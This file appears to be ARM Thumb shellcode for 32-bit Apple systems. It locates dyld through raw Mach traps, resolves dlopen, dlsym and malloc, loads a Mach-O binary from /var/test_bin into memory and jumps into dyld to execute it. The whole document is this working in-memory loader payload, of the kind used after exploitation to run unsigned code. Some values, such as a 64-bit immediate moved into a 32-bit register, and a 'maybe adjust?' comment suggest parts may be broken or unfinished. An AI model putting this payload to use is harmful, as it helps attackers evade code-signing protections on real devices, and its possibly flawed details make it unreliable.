.align 2
.thumb
.global _start

#define TRAP_MACH_MSG           #-31
#define TRAP_MACH_TASK_SELF     #-28
#define TRAP_MACH_REPLY_PORT    #-26

#define MSGH_BITS               0
#define MSGH_SIZE               4
#define MSGH_REMOTE_PORT        8
#define MSGH_LOCAL_PORT         12
#define MSGH_VOUCHER_PORT       16
#define MSGH_ID                 20
#define MSG_NDR                 24
#define MSG_OPT1                32
#define MSG_OPT2                36
#define MSG_ALL_IMAGE           40

#define SYS_READ                3
#define SYS_OPEN                5
#define SYS_LSEEK               199
#define SEEK_SET                0
#define SEEK_END                2

#define TASK_DYLD_INFO          17
#define TASK_DYLD_INFO_COUNT    5
#define IMAGE_LOAD_ADDR         20
#define DATA_STR                0x41445f5f
#define CONST_STR               0x6f635f5f
#define DYLD_DLOPEN_OFFSET      0x2c
#define DYLD_DLSYM_OFFSET       0x34

#define PARAMS_BASE             0
#define PARAMS_ARGC             4
#define PARAMS_ARGV0            8
#define PARAMS_ARGV1            12
#define PARAMS_ENV0             16
#define PARAMS_APPLE0           20
#define PARAMS_APPLE1           24
#define PARAMS_STRINGS          28


.macro mov32
    movw $0, #(($1) & 0xffff)
    movt $0, #((($1) >> 16) & 0xffff)
.endmacro


_start:
    push    {r7, lr}
    mov     r7, sp
    sub     sp, #0x90

    // find dyld_base
    mov     r12, TRAP_MACH_REPLY_PORT
    svc     #0x80
    str     r0, [sp, MSGH_LOCAL_PORT]
    mov     r9, r0

    mov     r12, TRAP_MACH_TASK_SELF
    svc     #0x80
    str     r0, [sp, MSGH_REMOTE_PORT]
    mov     r10, r0

    mov     r0, #0x1513
    str     r0, [sp, MSGH_BITS]
    mov     r0, #0x28
    str     r0, [sp, MSGH_SIZE]
    mov     r0, #0
    str     r0, [sp, MSGH_VOUCHER_PORT]
    mov     r0, #0xd4d
    str     r0, [sp, MSGH_ID]
    mov     r0, #0x100000000
    str     r0, [sp, MSG_NDR]
    mov     r0, #TASK_DYLD_INFO
    str     r0, [sp, MSG_OPT1]
    mov     r0, #TASK_DYLD_INFO_COUNT
    str     r0, [sp, MSG_OPT2]

    mov     r0, sp
    mov     r1, #3
    mov     r2, #0x28
    mov     r3, #0x13c
    mov     r4, r9
    mov     r5, #0
    mov     r6, r5

    mov     r12, TRAP_MACH_MSG
    svc     #0x80
    cmp     r0, #0
    bne     _quit

    ldr     r0, [sp, MSG_ALL_IMAGE]
    cmp     r0, #0
    beq     _quit

    ldr     r1, [r0, IMAGE_LOAD_ADDR]
    cmp     r1, #0
    beq     _quit

    adr     r0, _dyld_base
    str     r1, [r0]
    mov     r8, r1

    // find dyld __DATA,__const
    mov32   r6, CONST_STR
    mov32   r7, DATA_STR

0:
    add     r8, r8, #1
    ldr     r5, [r8]
    cmp     r5, r6
    bne     0b

    add     r8, r8, #0x10
    ldr     r5, [r8]
    cmp     r5, r7
    beq     1f
    b       0b

1:
    add     r8, r8, #0x18
    ldr     r8, [r8]
    add     r8, r8, r1

    // resolve dyld funcs
    add     r0, r8, DYLD_DLOPEN_OFFSET
    ldr     r0, [r0]
    cmp     r0, #0
    beq     _quit
    adr     r2, _dlopen
    str     r0, [r2]

    add     r0, r8, DYLD_DLSYM_OFFSET
    ldr     r0, [r0]
    cmp     r0, #0
    beq     _quit
    adr     r2, _dlsym
    str     r0, [r2]

    // get __dyld_start
    adr     r0, _dyld_base
    ldr     r0, [r0]
    add     r0, r0, #0x1000
    adr     r1, _dyld_start
    str     r0, [r1]

    // open target macho and get size
    mov     r12, SYS_OPEN
    adr     r0, _target_macho
    mov     r1, #0
    svc     #0x80
    cmp     r0, #0
    ble     _quit
    mov     r8, r0

    mov     r12, SYS_LSEEK
    movs    r1, #0
    mov     r2, r1
    mov     r3, SEEK_END
    svc     #0x80
    cmp     r0, #0
    ble     _quit
    mov     r9, r0

    mov     r12, SYS_LSEEK
    mov     r0, r8
    movs    r1, #0
    mov     r2, r1
    mov     r3, SEEK_SET
    svc     #0x80

    // get malloc ptr
    str     r8, [sp]
    str     r9, [sp, #0x4]

    movs    r5, #0
    mov     r6, r5
    mov     r7, sp
    sub     sp, #0x8

    adr     r12, _dlopen
    ldr     r12, [r12]
    adr     r0, _lib_system_str
    mov     r1, #0x2
    blx     r12
    cmp     r0, #0
    beq     _quit

    adr     r12, _dlsym
    ldr     r12, [r12]
    adr     r1, _malloc_str
    blx     r12
    cmp     r0, #0
    beq     _quit

    // allocate stack for target macho
    mov     r12, r0
    mov     r0, #0x800000
    blx     r12
    cmp     r0, #0
    beq     _quit

    add     sp, #0x8
    mov     r7, r0
    ldr     r8, [sp]
    ldr     r9, [sp, #0x4]

    // load in the target macho
    adr     r0, _start
    mov     r1, #0x0fff
    mvn     r1, r1
    and     r0, r0, r1
    add     r0, r0, #0x1000
    mov     r6, r0

    mov     r12, SYS_READ
    mov     r1, r0
    mov     r0, r8
    mov     r2, r9
    svc     #0x80
    cmp     r0, #0
    ble     _quit
    mov     r0, r6

    // setup for __dyld_start call
    add     r6, r7, #0x40000 // maybe adjust?
    str     r0, [r6, PARAMS_BASE]
    mov     r0, #1
    str     r0, [r6, PARAMS_ARGC]
    add     r0, r6, PARAMS_STRINGS
    str     r0, [r6, PARAMS_ARGV0]
    str     r0, [r6, PARAMS_APPLE0]
    mov     r0, #0
    str     r0, [r6, PARAMS_ARGV1]
    str     r0, [r6, PARAMS_ENV0]
    str     r0, [r6, PARAMS_APPLE1]

    adr     r0, _empty_str
    str     r0, [r6, PARAMS_STRINGS]
    adr     r0, _dyld_start
    ldr     r12, [r0]
    mov     sp, r6
    bx      r12

    add     sp, #0x90
    pop     {r7, pc}
    nop
    b       #-4
    

_quit:
    trap
    nop


_dyld_base:         .long 0x0
_dyld_start:        .long 0x0
_dlopen:            .long 0x0
_dlsym:             .long 0x0
_lib_system_str:    .ascii "/usr/lib/libSystem.B.dylib\0\0"
_malloc_str:        .ascii "malloc\0\0"
_target_macho:      .ascii "/var/test_bin\0\0\0"
_empty_str:         .ascii "\0\0\0\0"
